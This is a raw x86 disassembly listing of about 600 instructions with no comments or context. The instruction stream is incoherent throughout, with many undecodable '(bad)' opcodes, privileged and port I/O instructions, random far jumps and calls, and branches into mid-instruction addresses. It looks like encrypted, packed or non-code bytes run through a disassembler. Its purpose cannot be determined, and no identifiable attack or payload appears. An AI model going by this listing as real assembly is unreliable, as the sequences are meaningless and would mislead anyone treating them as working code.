  41d8c9:	xor    ah,BYTE PTR ds:0xa8a3b3ff
  41d8cf:	shr    BYTE PTR [ecx+0x6d],1
  41d8d2:	mov    esi,0xb74376e6
  41d8d7:	mov    bl,0x74
  41d8d9:	pop    edi
  41d8da:	adc    bl,ch
  41d8dc:	pop    eax
  41d8dd:	fwait
  41d8de:	rol    DWORD PTR [edi-0x200147a5],0x49
  41d8e5:	pop    esi
  41d8e6:	adc    BYTE PTR [ebp-0x3f],al
  41d8e9:	mov    eax,0x662b42e2
  41d8ee:	jp     0x41d913
  41d8f0:	adc    BYTE PTR [ebp+0x4c],dl
  41d8f3:	std    
  41d8f4:	inc    ecx
  41d8f5:	or     eax,esi
  41d8f7:	xchg   DWORD PTR [edx],edx
  41d8f9:	dec    eax
  41d8fa:	dec    eax
  41d8fb:	imul   esp,DWORD PTR [ecx-0x6ed995af],0x74e7d4e9
  41d905:	outs   dx,BYTE PTR ds:[esi]
  41d906:	retf   0xe633
  41d909:	xchg   ebp,eax
  41d90a:	mov    DWORD PTR [ecx],eax
  41d90c:	cmp    BYTE PTR [ebx+0x24],cl
  41d90f:	ss cmp al,0xb0
  41d912:	popa   
  41d913:	rcr    BYTE PTR [ebx-0x51],1
  41d916:	jecxz  0x41d958
  41d918:	push   edi
  41d919:	je     0x41d8da
  41d91b:	jmp    0x41d96a
  41d91d:	inc    esi
  41d91e:	xor    cl,BYTE PTR [esi+esi*8+0x65]
  41d922:	pusha  
  41d923:	xor    BYTE PTR [ebx+ecx*1-0x5230f97d],ah
  41d92a:	jmp    0x5b42:0xb30efb7a
  41d931:	xor    DWORD PTR [ebx+0x30],esi
  41d934:	jbe    0x41d935
  41d936:	mov    eax,0x5734a678
  41d93b:	adc    BYTE PTR [eax+ebx*2+0x4a],0x29
  41d940:	and    ebp,esi
  41d942:	pop    ecx
  41d943:	(bad)  
  41d944:	jo     0x41d8ee
  41d946:	push   eax
  41d947:	add    DWORD PTR [ebp-0x1ee0f453],edi
  41d94d:	pushf  
  41d94e:	scas   al,BYTE PTR es:[edi]
  41d94f:	and    ebp,0xffffffe4
  41d952:	pop    esp
  41d953:	sub    cl,BYTE PTR ds:0xea8e4b21
  41d959:	(bad)  
  41d95a:	mov    WORD PTR [edi],cs
  41d95c:	cwde   
  41d95d:	jp     0x41d9be
  41d95f:	jmp    0x4b36:0x9a7dbec5
  41d966:	jb     0x41d97c
  41d968:	sbb    eax,0x23727cb4
  41d96d:	push   0xffffff8f
  41d96f:	cmp    DWORD PTR [edx-0x576e5cbd],0x28
  41d976:	and    eax,ebx
  41d978:	in     eax,dx
  41d979:	outs   dx,BYTE PTR ss:[esi]
  41d97b:	outs   dx,DWORD PTR ds:[esi]
  41d97c:	sub    eax,DWORD PTR [eax+0x5f]
  41d97f:	mov    ds:0xefb74d26,eax
  41d984:	push   cs
  41d985:	inc    esp
  41d986:	jmp    0x41d9c4
  41d988:	dec    edi
  41d989:	cmp    eax,0x6b99d20
  41d98e:	sub    ch,BYTE PTR [eax-0x97a908]
  41d994:	and    eax,0x848e626c
  41d999:	cmp    al,0x68
  41d99b:	int3   
  41d99c:	jns    0x41d948
  41d99e:	mov    ebp,0xb02c22de
  41d9a3:	out    dx,al
  41d9a4:	or     al,0x85
  41d9a6:	lods   eax,DWORD PTR ds:[esi]
  41d9a7:	mov    DWORD PTR [ebx-0x61],edi
  41d9aa:	push   esp
  41d9ab:	aam    0xa9
  41d9ad:	cld    
  41d9ae:	inc    edi
  41d9af:	leave  
  41d9b0:	inc    bh
  41d9b2:	add    DWORD PTR [esi+0x49],0xa875b0f6
  41d9b9:	dec    eax
  41d9ba:	pop    edx
  41d9bb:	aam    0x59
  41d9bd:	out    dx,al
  41d9be:	jae    0x41d9aa
  41d9c0:	adc    esp,eax
  41d9c2:	mov    ah,0xe4
  41d9c4:	pop    ds
  41d9c5:	and    DWORD PTR [ebp+ecx*8-0x4a],0x6808cce0
  41d9cd:	ins    BYTE PTR es:[edi],dx
  41d9ce:	inc    edi
  41d9cf:	test   al,0xf8
  41d9d1:	and    eax,0x867a7b0e
  41d9d6:	retf   
  41d9d7:	loopne 0x41da53
  41d9d9:	mov    al,0xc8
  41d9db:	or     eax,esi
  41d9dd:	clc    
  41d9de:	cdq    
  41d9df:	adc    eax,edi
  41d9e1:	adc    ah,bh
  41d9e3:	mov    cs,ebx
  41d9e5:	cwde   
  41d9e6:	pop    edi
  41d9e7:	dec    ebx
  41d9e8:	ins    BYTE PTR es:[edi],dx
  41d9e9:	pop    es
  41d9ea:	mov    esp,0xec63bb34
  41d9ef:	or     eax,0x13a68d29
  41d9f4:	ins    BYTE PTR es:[edi],dx
  41d9f5:	(bad)  
  41d9f6:	into   
  41d9f7:	xchg   DWORD PTR [eax-0x38],edi
  41d9fa:	hlt    
  41d9fb:	dec    ebp
  41d9fc:	in     al,0x78
  41d9fe:	pop    ds
  41d9ff:	iret   
  41da00:	push   esp
  41da01:	lods   eax,DWORD PTR ds:[esi]
  41da02:	ret    
  41da03:	outs   dx,DWORD PTR ds:[esi]
  41da04:	repnz push es
  41da06:	pop    es
  41da07:	retf   
  41da08:	dec    edx
  41da09:	mov    cl,0x7e
  41da0b:	das    
  41da0c:	test   al,0x83
  41da0e:	sbb    BYTE PTR [ecx-0x17d73963],al
  41da14:	aaa    
  41da15:	aaa    
  41da16:	call   0xedb771f4
  41da1b:	stos   BYTE PTR es:[edi],al
  41da1c:	jns    0x41d9b1
  41da1e:	sbb    DWORD PTR [eax],edx
  41da20:	out    0x14,al
  41da22:	inc    ebx
  41da23:	sahf   
  41da24:	ja     0x41da3c
  41da26:	(bad)  
  41da27:	cmp    ebp,DWORD PTR [eax-0x42779c64]
  41da2d:	dec    edx
  41da2e:	(bad)  
  41da2f:	and    BYTE PTR [ebp+0x3],cl
  41da32:	dec    ebx
  41da33:	(bad)  
  41da34:	jb     0x41da36
  41da36:	in     al,dx
  41da37:	jae    0x41d9cd
  41da39:	mov    WORD PTR [ebx+0x3de6f74f],ds
  41da3f:	jmp    0x73bb:0xfcadbd5d
  41da46:	in     al,0x31
  41da48:	(bad)  
  41da4a:	pop    ss
  41da4b:	dec    edx
  41da4c:	and    DWORD PTR [eax],edx
  41da4e:	je     0x41da8d
  41da50:	sub    BYTE PTR [ebp+0x5c89d0c5],bh
  41da56:	pop    ss
  41da57:	mov    cl,0xd7
  41da59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da5a:	jno    0x41da65
  41da5c:	xor    eax,0x8549727f
  41da61:	pop    es
  41da62:	sub    al,BYTE PTR [edi]
  41da64:	inc    ebp
  41da65:	(bad)  
  41da66:	je     0x41da93
  41da68:	mov    ecx,DWORD PTR [ebp-0x5f9c9a21]
  41da6e:	icebp  
  41da6f:	ret    
  41da70:	and    bh,BYTE PTR [esi+0x24551123]
  41da76:	lds    ebx,FWORD PTR [esi+0x41]
  41da79:	fistp  QWORD PTR [esi+eax*4]
  41da7c:	push   0xffffffeb
  41da7e:	mov    al,0xd7
  41da80:	mov    ah,BYTE PTR [esi-0x7f02f0dd]
  41da86:	dec    edx
  41da87:	(bad)  
  41da88:	ins    BYTE PTR es:[edi],dx
  41da89:	jb     0x41dadf
  41da8b:	and    BYTE PTR [edi],ch
  41da8d:	call   0xde6c:0xae1ce96d
  41da94:	(bad)  
  41da95:	cmc    
  41da96:	or     BYTE PTR [edi],0x8a
  41da99:	int    0xe9
  41da9b:	dec    esi
  41da9c:	arpl   ax,cx
  41da9e:	jbe    0x41db12
  41daa0:	jg     0x41da66
  41daa2:	add    ebx,DWORD PTR [eax+0x664da53e]
  41daa8:	push   ds
  41daa9:	sbb    dh,BYTE PTR [esi]
  41daab:	repnz (bad) 
  41daae:	sahf   
  41daaf:	lods   eax,DWORD PTR ds:[esi]
  41dab0:	pusha  
  41dab1:	pop    edi
  41dab2:	pop    edx
  41dab3:	push   ebx
  41dab4:	mov    al,0x1d
  41dab6:	and    esp,eax
  41dab8:	or     al,0x8a
  41daba:	out    dx,al
  41dabb:	mov    esp,0xae8f28f6
  41dac0:	loope  0x41db0a
  41dac2:	out    0x84,al
  41dac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dac5:	dec    esp
  41dac6:	push   edx
  41dac7:	(bad)  
  41dac9:	push   ss
  41daca:	xor    eax,0x1b766083
  41dacf:	or     eax,0x883f8f1f
  41dad4:	dec    eax
  41dad5:	imul   DWORD PTR [eax-0x336c478c]
  41dadb:	std    
  41dadc:	leave  
  41dadd:	push   ebx
  41dade:	sbb    BYTE PTR [edx+esi*1],dh
  41dae1:	int3   
  41dae2:	data16 add BYTE PTR ds:0x977b3da9,dl
  41dae9:	dec    ecx
  41daea:	into   
  41daeb:	mov    cl,0x9f
  41daed:	ins    BYTE PTR es:[edi],dx
  41daee:	jns    0x41db52
  41daf0:	or     BYTE PTR [edx],0xa0
  41daf3:	ja     0x41da8a
  41daf5:	inc    esi
  41daf6:	icebp  
  41daf7:	lods   al,BYTE PTR ds:[esi]
  41daf8:	adc    edi,DWORD PTR fs:[edi]
  41dafb:	adc    al,0xb9
  41dafd:	jae    0x41db0b
  41daff:	dec    edi
  41db00:	bound  edi,QWORD PTR ds:0x963f1563
  41db06:	sbb    esp,DWORD PTR [esi+0x3b]
  41db09:	(bad)  
  41db0b:	retf   0xb3e9
  41db0e:	inc    ebx
  41db0f:	pop    ecx
  41db10:	fistp  WORD PTR [ebx-0x24]
  41db13:	mov    DWORD PTR [ecx],esi
  41db15:	sbb    edx,edx
  41db17:	jo     0x41db8e
  41db19:	sub    al,0x1d
  41db1b:	je     0x41db28
  41db1d:	jae    0x41daab
  41db1f:	mov    bh,0x36
  41db21:	(bad)  
  41db22:	sub    eax,DWORD PTR [esi-0x57]
  41db25:	or     eax,0x37c7182c
  41db2a:	mov    esi,0x83ef6a7e
  41db2f:	loopne 0x41dbad
  41db31:	ja     0x41db87
  41db33:	xor    esp,ebp
  41db35:	xlat   BYTE PTR ds:[ebx]
  41db36:	push   es
  41db37:	mov    ds:0x663adaf2,al
  41db3c:	inc    ebx
  41db3d:	sahf   
  41db3e:	pop    esp
  41db3f:	lds    eax,FWORD PTR [edi]
  41db41:	and    ebp,DWORD PTR [ebp-0x76]
  41db44:	mov    dl,0x91
  41db46:	push   ss
  41db47:	jne    0x41db1b
  41db49:	or     DWORD PTR [ebp-0x28797fae],esi
  41db4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db50:	adc    eax,0x60d99f60
  41db55:	mov    edi,0x20ad04da
  41db5a:	lods   eax,DWORD PTR ds:[esi]
  41db5b:	inc    ecx
  41db5c:	push   cs
  41db5d:	(bad)  
  41db5e:	xor    esp,ecx
  41db60:	mov    ch,0x74
  41db62:	in     al,dx
  41db63:	sbb    BYTE PTR [eax-0x7e],dh
  41db66:	mov    WORD PTR [esi],ds
  41db68:	pop    ebx
  41db69:	cdq    
  41db6a:	(bad)
  41db6f:	inc    edx
  41db70:	mov    ds:0x2ae3e806,eax
  41db75:	push   ecx
  41db76:	inc    ecx
  41db77:	jne    0x41dbf1
  41db79:	xchg   ebp,eax
  41db7a:	mov    al,0x8a
  41db7c:	jl     0x41db38
  41db7e:	or     cl,al
  41db80:	xchg   DWORD PTR [ecx],edi
  41db82:	mov    bl,0x93
  41db84:	sbb    al,0x3e
  41db86:	mov    ds:0xa5ef1768,eax
  41db8b:	int    0x1a
  41db8d:	cmc    
  41db8e:	fisub  DWORD PTR [edi+0x6379b1ef]
  41db94:	addr16 dec ebx
  41db96:	push   ds
  41db97:	adc    eax,0x737bd6de
  41db9c:	pop    ds
  41db9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db9e:	mov    bl,0x2b
  41dba0:	add    al,0xce
  41dba2:	xchg   edx,eax
  41dba3:	and    eax,0x8a63aa86
  41dba8:	adc    DWORD PTR [eax-0x52],ecx
  41dbab:	into   
  41dbac:	pop    ecx
  41dbad:	sbb    edi,DWORD PTR [eax-0x23f62aac]
  41dbb3:	pop    ebx
  41dbb4:	dec    edi
  41dbb5:	(bad)  
  41dbb6:	enter  0x14aa,0x8f
  41dbba:	pop    ecx
  41dbbb:	dec    edx
  41dbbc:	mov    ds:0x7474be49,al
  41dbc1:	outs   dx,DWORD PTR ds:[esi]
  41dbc2:	and    ecx,DWORD PTR [ebx-0x64]
  41dbc5:	mov    dl,0x8e
  41dbc7:	fisttp QWORD PTR [ebp-0x31]
  41dbca:	sub    BYTE PTR [edi],dh
  41dbcc:	sub    dl,bl
  41dbce:	inc    edi
  41dbcf:	cmp    al,0x9b
  41dbd1:	pop    edi
  41dbd2:	jle    0x41dc07
  41dbd4:	add    al,ch
  41dbd6:	pusha  
  41dbd7:	xor    dh,dl
  41dbd9:	xor    DWORD PTR [edi+0x25c8ca24],ecx
  41dbdf:	fwait
  41dbe0:	cs call 0xb24:0x8ae6b6df
  41dbe8:	inc    esp
  41dbe9:	mov    esp,0xf4535061
  41dbee:	and    dl,bl
  41dbf0:	retf   
  41dbf1:	popf   
  41dbf2:	mov    edx,0xe0479c45
  41dbf7:	scas   al,BYTE PTR es:[edi]
  41dbf8:	mov    edi,0xf0425814
  41dbfd:	mov    ah,0x44
  41dbff:	mov    al,0xae
  41dc01:	inc    edx
  41dc02:	(bad)  
  41dc03:	(bad)  
  41dc04:	dec    edx
  41dc05:	push   ebx
  41dc06:	mov    eax,ds:0x6535540
  41dc0b:	es xchg edi,eax
  41dc0d:	popf   
  41dc0e:	in     eax,dx
  41dc0f:	mov    DWORD PTR [edi-0x66],esp
  41dc12:	arpl   WORD PTR [esi],sp
  41dc14:	xor    ebp,DWORD PTR [esi-0x48]
  41dc17:	dec    ecx
  41dc18:	lea    eax,ds:0xac23c53a
  41dc1e:	adc    al,dl
  41dc20:	jnp    0x41dbc5
  41dc22:	iret   
  41dc23:	xor    eax,0x813fd887
  41dc28:	adc    DWORD PTR [edi+0x16],eax
  41dc2b:	je     0x41dc46
  41dc2d:	xchg   BYTE PTR [esi-0x6b5b2926],bl
  41dc33:	adc    eax,0x211c5c86
  41dc38:	cdq    
  41dc39:	jmp    0x43770285
  41dc3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc3f:	nop
  41dc40:	scas   al,BYTE PTR es:[edi]
  41dc41:	sbb    al,0x6d
  41dc43:	add    eax,0xae4524c4
  41dc48:	jge    0x41dc69
  41dc4a:	mov    edx,0xebb23d75
  41dc4f:	dec    ebp
  41dc50:	inc    ebx
  41dc51:	pop    edx
  41dc52:	leave  
  41dc53:	push   esp
  41dc54:	loope  0x41dbe0
  41dc56:	xchg   esp,eax
  41dc57:	test   DWORD PTR [eax+edx*1],ecx
  41dc5a:	fs inc esi
  41dc5c:	mov    ah,BYTE PTR [ebp-0xb]
  41dc5f:	mov    al,ds:0xfc3b94f8
  41dc64:	sub    esp,DWORD PTR [edx-0x45]
  41dc67:	sub    ch,al
  41dc69:	shl    DWORD PTR [ebx-0x35],0xc9
  41dc6d:	mov    edi,0x8e8da2b4
  41dc72:	mov    edx,0x63a67844
  41dc77:	call   0x659b3205
  41dc7c:	sub    eax,0xa6c962d9
  41dc81:	mov    BYTE PTR [ecx+0x15],ch
  41dc84:	jns    0x41dc2b
  41dc86:	stos   BYTE PTR es:[edi],al
  41dc87:	xor    edx,DWORD PTR [esp+eiz*2]
  41dc8a:	pop    edi
  41dc8b:	mov    ecx,0x94425153
  41dc90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc91:	sti    
  41dc92:	cmp    edi,ecx
  41dc94:	mov    ah,0x88
  41dc96:	push   cs
  41dc97:	test   al,0xd0
  41dc99:	mov    eax,gs
  41dc9b:	jl     0x41dcee
  41dc9d:	mov    DWORD PTR ds:[edx+eiz*2],edi
  41dca1:	push   esp
  41dca2:	ficomp DWORD PTR [ecx+0x25994237]
  41dca8:	in     al,0x15
  41dcaa:	sahf   
  41dcab:	xor    BYTE PTR [edx],bh
  41dcad:	or     ebx,DWORD PTR [eax-0x1e3454ca]
  41dcb3:	sbb    al,BYTE PTR [edi+0x6f760af1]
  41dcb9:	push   0x47
  41dcbb:	bound  edx,QWORD PTR [edi+0x54e23e3b]
  41dcc1:	inc    ebp
  41dcc2:	jecxz  0x41dd00
  41dcc4:	push   0xb
  41dcc6:	mov    edi,0xd865895f
  41dccb:	sbb    eax,0xaaddd642
  41dcd0:	add    ebp,ecx
  41dcd2:	mov    ebx,DWORD PTR [edi]
  41dcd4:	jbe    0x41dcec
  41dcd6:	rcl    BYTE PTR [ebp+0xb],cl
  41dcd9:	sbb    DWORD PTR [edx+0x1614955c],ebp
  41dcdf:	sub    dl,dl
  41dce1:	xor    BYTE PTR [edi-0x32],0x1f
  41dce5:	call   0xe559:0x5844a937
  41dcec:	rol    DWORD PTR [esi],1
  41dcee:	rol    BYTE PTR [esp+ebx*1+0x6638640d],cl
  41dcf5:	std    
  41dcf6:	sbb    al,0x80
  41dcf8:	mov    dl,0x8
  41dcfa:	mov    al,ds:0x52708c04
  41dcff:	loope  0x41dd71
  41dd01:	add    esp,0x3f
  41dd04:	(bad)  
  41dd05:	and    BYTE PTR [edi],bh
  41dd07:	push   edx
  41dd08:	add    DWORD PTR [esi+0x187e48e6],edx
  41dd0e:	adc    bl,BYTE PTR [eax-0x68]
  41dd11:	add    esp,DWORD PTR [edx-0x189e3383]
  41dd17:	push   ds
  41dd18:	out    dx,eax
  41dd19:	sub    al,0x8d
  41dd1c:	gs hlt 
  41dd1e:	popa   
  41dd1f:	pop    esi
  41dd20:	inc    eax
  41dd21:	pop    ss
  41dd22:	lods   al,BYTE PTR ds:[esi]
  41dd23:	inc    eax
  41dd24:	enter  0x7e41,0xf7
  41dd28:	jno    0x41dce0
  41dd2a:	sar    BYTE PTR [esi],0x40
  41dd2d:	dec    ebp
  41dd2e:	xor    cl,dl
  41dd30:	sar    DWORD PTR [ebp+0x763a2634],cl
  41dd36:	fcmovnu st,st(3)
  41dd38:	mov    ebx,0x6bbbe59b
  41dd3d:	loope  0x41dd14
  41dd3f:	xor    al,0xb0
  41dd41:	mov    bl,0x11
  41dd43:	jns    0x41dd57
  41dd45:	addr16 mov dl,0x86
  41dd48:	pop    ds
  41dd49:	push   ds
  41dd4a:	mul    DWORD PTR [ecx]
  41dd4c:	ret    0x8cbd
  41dd4f:	adc    dl,BYTE PTR [esi]
  41dd51:	xchg   edx,eax
  41dd52:	mov    ebx,0x95abb619
  41dd57:	jmp    0x8191:0xba1c778f
  41dd5e:	nop
  41dd5f:	out    dx,eax
  41dd60:	shl    BYTE PTR [ebp+0x60],1
  41dd63:	test   BYTE PTR [ebp-0x3d],dl
  41dd66:	popa   
  41dd67:	mov    ecx,0xb167622d
  41dd6c:	inc    edx
  41dd6d:	adc    BYTE PTR [edx],dl
  41dd6f:	sub    DWORD PTR [edi+0x3b6b3696],eax
  41dd75:	mov    ah,0xd1
  41dd77:	mov    bl,0x98
  41dd79:	and    DWORD PTR [edx+0x6d],eax
  41dd7c:	sbb    eax,0xf85b2884
  41dd81:	loopne 0x41dd8a
  41dd83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd84:	ror    BYTE PTR ds:0x59a00d5d,0x45
  41dd8b:	scas   eax,DWORD PTR es:[edi]
  41dd8c:	push   ebx
  41dd8d:	out    dx,al
  41dd8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd8f:	mov    ds:0x71124242,eax
  41dd94:	in     al,dx
  41dd95:	pop    ds
  41dd96:	fistp  DWORD PTR [eax-0x1]
  41dd99:	dec    edi
  41dd9a:	push   es
  41dd9b:	xchg   ebx,esi
  41dd9d:	call   0x88f53493
  41dda2:	idiv   DWORD PTR [edi+ecx*4]
  41dda5:	aam    0x18
  41dda7:	push   esp
  41dda8:	add    ah,ch
  41ddaa:	retf   0xe2ff
  41ddad:	jg     0x41ddc8
  41ddaf:	pop    ss
  41ddb0:	jns    0x41dddb
  41ddb2:	(bad)  
  41ddb3:	fistp  DWORD PTR [ebp+0x6b]
  41ddb6:	and    BYTE PTR [edi],bl
  41ddb8:	fidivr DWORD PTR [edi-0x10c2776e]
  41ddbe:	xor    BYTE PTR [ecx+0x13c6b5e5],ah
  41ddc4:	jl     0x41dd93
  41ddc6:	repz cmp bh,BYTE PTR [edi+edx*8]
  41ddca:	call   0x5deece46
  41ddcf:	jmp    0xdf11:0x7294434d
  41ddd6:	dec    esi
  41ddd7:	das    
  41ddd8:	and    ebp,DWORD PTR [ecx+0x65118f11]
  41ddde:	sbb    ah,BYTE PTR [edi+edx*2-0x12570286]
  41dde5:	cs out dx,eax
  41dde7:	(bad)  
  41dde8:	mov    ds:0x17e7a1f4,eax
  41dded:	mov    eax,0x1a908200
  41ddf2:	(bad)  
  41ddf3:	sub    DWORD PTR [ebp+0x2ae63e8f],edx
  41ddf9:	xchg   ch,dl
  41ddfb:	add    DWORD PTR [ebp+0x7a],ebp
  41ddfe:	ret    
  41ddff:	jp     0x41de75
  41de01:	inc    eax
  41de02:	psubw  mm2,mm6
  41de05:	(bad)  
  41de06:	push   ecx
  41de07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de08:	inc    edi
  41de09:	(bad)  
  41de0a:	jbe    0x41de21
  41de0c:	stos   DWORD PTR es:[edi],eax
  41de0d:	inc    ecx
  41de0e:	inc    esp
  41de0f:	jb     0x41de1b
  41de11:	fnsave [esi]
  41de13:	add    eax,0x366e4190
  41de18:	pop    edx
  41de19:	test   DWORD PTR [edx],edx
  41de1b:	call   0x1c27:0x67ecd650
  41de22:	imul   eax,DWORD PTR [ecx-0x253f7637],0x39a7f7d5
  41de2c:	push   esp
  41de2d:	stc    
  41de2e:	and    bl,BYTE PTR [edx-0x45]
  41de31:	add    eax,0xb275d8fa
  41de36:	nop
  41de37:	jmp    0x41ddbb
  41de39:	cmp    eax,0xf6e2d773
  41de3e:	int3   
  41de3f:	and    BYTE PTR [esi+eiz*1+0x60ce4bb0],al
  41de46:	xchg   ebp,eax
  41de47:	mov    eax,0x61d3f3da
  41de4c:	push   ss
  41de4d:	or     ebp,DWORD PTR es:[edx]
  41de50:	outs   dx,BYTE PTR ds:[esi]
  41de51:	enter  0x152f,0x97
  41de55:	fiadd  WORD PTR ds:0x548e8da6
  41de5b:	pop    eax
  41de5c:	clc    
  41de5d:	mov    ch,0x91
  41de5f:	cwde   
  41de60:	cmp    al,0x2
  41de63:	sbb    BYTE PTR [edx-0x37f18ff7],dl
  41de69:	fist   DWORD PTR ds:0xbd9d3a85
  41de70:	xchg   esi,eax
  41de71:	push   0x41e84b23
  41de76:	dec    edx
  41de77:	(bad)  
  41de78:	fimul  DWORD PTR [edx+esi*1-0x48d3960]
  41de7f:	cmp    eax,0x110b8aa0
  41de84:	jae    0x41de81
  41de86:	or     DWORD PTR [edi],eax
  41de88:	jg     0x41dee2
  41de8a:	arpl   WORD PTR [edi+0x20],bp
  41de8d:	hlt    
  41de8e:	hlt    
  41de8f:	xor    DWORD PTR [edi+ebp*8],edx
  41de92:	jp     0x41deb1
  41de94:	dec    ecx
  41de95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de96:	sbb    eax,0x396961e5
  41de9b:	pusha  
  41de9c:	xchg   ecx,eax
  41de9d:	mov    ds:0xef5dfd86,al
  41dea2:	sbb    edx,DWORD PTR [esi+0xf]
  41dea5:	dec    edi
  41dea6:	scas   eax,DWORD PTR es:[edi]
  41dea7:	jge    0x41de93
  41dea9:	pop    edx
  41deaa:	icebp  
  41deab:	jp     0x41dea7
  41dead:	pop    ebx
  41deae:	lods   eax,DWORD PTR gs:[esi]
  41deb0:	(bad)  
  41deb1:	adc    ebp,esi
  41deb3:	xor    dl,dh
  41deb5:	adc    BYTE PTR [ecx],ch
  41deb7:	mov    ds:0xf9cf7e75,al
  41debc:	pop    edx
  41debd:	shl    BYTE PTR [edi-0x53],cl
  41dec0:	les    esp,FWORD PTR ds:0xa318701d
  41dec6:	push   eax
  41dec7:	scas   al,BYTE PTR es:[edi]
  41dec8:	pop    edx
  41dec9:	mov    WORD PTR [eax+edi*4+0x27],es
  41decd:	mov    cl,0x1b
  41decf:	xchg   DWORD PTR [esi-0x1c],esp
  41ded2:	push   edx
  41ded3:	xchg   ecx,eax
  41ded4:	xlat   BYTE PTR ds:[ebx]
  41ded5:	xor    eax,0xee1ba640
  41deda:	push   ss
  41dedb:	and    eax,0x42ae2117
  41dee0:	je     0x41de9a
  41dee2:	push   0xa2825300
  41dee7:	jp     0x41ded1
  41dee9:	and    DWORD PTR [edi+0x2d],esp
  41deec:	pop    esp
  41deed:	inc    esi
  41deee:	test   DWORD PTR [eax+0x65],eax
  41def1:	scas   eax,DWORD PTR es:[edi]
  41def2:	xor    DWORD PTR [eax],eax
  41def4:	inc    ebx
  41def5:	push   ebx
  41def6:	in     al,dx
  41def7:	mov    ah,0xe
  41def9:	jge    0x41dee2
  41defb:	jmp    0xe56e:0x47d889bd
  41df02:	cmp    DWORD PTR [ecx-0x2c6b4de7],ebx
  41df08:	jo     0x41df85
  41df0a:	test   BYTE PTR [edi],cl
  41df0c:	pop    eax
  41df0d:	(bad)  
  41df0e:	int3   
  41df0f:	add    eax,0x5b2b1f5e
  41df14:	or     eax,0x188ae31f
  41df19:	fisttp WORD PTR [edi]
  41df1b:	ror    bh,0xa6
  41df1e:	(bad)  
  41df1f:	neg    bh
  41df21:	leave  
  41df22:	(bad)  
  41df23:	outs   dx,DWORD PTR ds:[esi]
  41df24:	loopne 0x41dec9
  41df26:	push   ss
  41df27:	sbb    al,BYTE PTR [esp+eax*8-0x6e]
  41df2b:	and    ebx,DWORD PTR [ecx]
  41df2d:	shr    BYTE PTR [eax+0x23c33904],0x3
  41df34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df35:	repnz or ecx,DWORD PTR [esi]
  41df38:	add    cl,BYTE PTR ds:0x628ac2c9
  41df3e:	imul   esp,DWORD PTR [esi-0x1a70e9dc],0xffffffb2
  41df45:	das    
  41df46:	cdq    
  41df47:	jmp    0x8cc89d56
  41df4c:	pop    ds
  41df4d:	sub    edx,ebp
  41df4f:	sahf   
  41df50:	mov    dh,0x84
  41df52:	pushf  
  41df53:	adc    al,0x43
  41df55:	arpl   WORD PTR [ebp+0x801d41],sp
  41df5b:	dec    esp
  41df5c:	lahf   
  41df5d:	test   eax,0x117e9d75
  41df62:	(bad)  
  41df63:	mov    al,0xc0
  41df65:	stos   DWORD PTR es:[edi],eax
  41df66:	(bad)  
  41df67:	mov    esi,0x89938f47
  41df6c:	std    
  41df6d:	xchg   esp,eax
  41df6e:	add    esi,DWORD PTR [ecx-0x5f]
  41df71:	xchg   esp,eax
  41df72:	add    BYTE PTR [ebx-0x7c],al
  41df75:	cmp    BYTE PTR [ebx+0x705d28e9],al
  41df7b:	(bad)  
  41df7d:	test   BYTE PTR [eax-0x7b798d3b],bh
  41df83:	or     al,0x45
  41df85:	jmp    0x41df26
  41df87:	inc    ebp
  41df88:	rcr    BYTE PTR [ecx],0xd0
  41df8b:	retf   0x3e62
  41df8e:	ret    
  41df8f:	sub    bh,ah
  41df91:	mov    ecx,0x3592a17c
  41df96:	repz xor DWORD PTR [ebx+0x303e91d8],0xb5a6bcdb
  41dfa1:	int    0x73
  41dfa3:	add    al,0x31
  41dfa5:	retf   0x3c2c
  41dfa8:	jp     0x41df3e
  41dfaa:	cs push esp
  41dfac:	call   0x3af74477
  41dfb1:	inc    esp
  41dfb2:	leave  
  41dfb3:	retf   0x5442
  41dfb6:	scas   al,BYTE PTR es:[edi]
  41dfb7:	icebp  
  41dfb8:	inc    esp
  41dfb9:	aas    
  41dfba:	retf   0x570
  41dfbd:	dec    esp
  41dfbe:	dec    eax
  41dfbf:	(bad)  
  41dfc0:	sbb    dl,BYTE PTR [ebp-0x75]
  41dfc3:	jno    0x41df68
  41dfc5:	cmp    cl,BYTE PTR [ecx+ecx*2]
  41dfc8:	pop    ecx
  41dfc9:	xor    BYTE PTR [eax+0x52c8fad8],al
  41dfcf:	push   ebp
  41dfd0:	aaa    
  41dfd1:	add    cl,0xae
  41dfd4:	xor    eax,0x3962963f
  41dfd9:	hlt    
  41dfda:	or     eax,0x1bf9fe7e
  41dfdf:	and    DWORD PTR [esi],edi
  41dfe1:	xor    al,0x60
  41dfe3:	pop    es
  41dfe4:	out    0x1e,al
  41dfe6:	xchg   edi,eax
  41dfe7:	push   ds
  41dfe8:	push   edx
  41dfe9:	dec    edi
  41dfea:	inc    edx
  41dfeb:	and    al,0x21
  41dfed:	sub    edx,DWORD PTR [ebp-0x236a86f9]
  41dff3:	test   DWORD PTR [ecx],eax
  41dff5:	and    edi,edi
  41dff7:	adc    al,0x8
  41dff9:	jl     0x41e003
  41dffb:	fisub  DWORD PTR [ecx+0x4cbc3691]
  41e001:	dec    DWORD PTR [esp+edx*1+0x9]
  41e005:	mov    ch,0xb3
  41e007:	mov    BYTE PTR [ebx-0x9fbfe95],bh
  41e00d:	loop   0x41e06d
  41e00f:	enter  0xae90,0x40
  41e013:	xchg   esi,eax
  41e014:	xchg   ebx,eax
  41e015:	mov    al,ds:0x5c09d7fd
  41e01a:	mov    ecx,0xf8654f5d
  41e01f:	js     0x41e06b
  41e021:	sub    DWORD PTR [eax-0x2d0010bd],esp
  41e027:	pop    eax
  41e028:	push   esi
  41e029:	add    eax,0xc36bc028
  41e02e:	test   DWORD PTR [ebx-0x17],ebx
  41e031:	sub    eax,0x2d902c71
  41e036:	pop    ebp
  41e037:	ret    0x4668
  41e03a:	jbe    0x41dfc7
  41e03c:	mov    bh,0xe9
  41e03e:	aad    0x86
  41e040:	xchg   ebx,eax
